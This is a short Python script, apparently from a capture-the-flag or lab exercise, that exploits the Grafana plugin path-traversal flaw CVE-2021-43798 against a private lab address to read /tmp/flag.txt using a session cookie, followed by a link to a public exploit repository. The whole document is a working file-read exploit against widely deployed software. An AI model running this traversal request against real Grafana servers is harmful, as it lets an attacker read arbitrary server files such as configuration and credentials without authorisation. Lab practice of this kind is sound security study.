```python
import base64, urllib.parse, requests

URL = "http://10.10.0.109:3000"
LFI = "/public/plugins/welcome/../../../../../../../../tmp/flag.txt"
COOKIE = {"grafana_session":"e64162f1657748b100ff79eefaefb769"}

r = requests.get(URL + LFI, cookies=COOKIE)
print(r.text)
```

## 
- https://github.com/jas502n/Grafana-CVE-2021-43798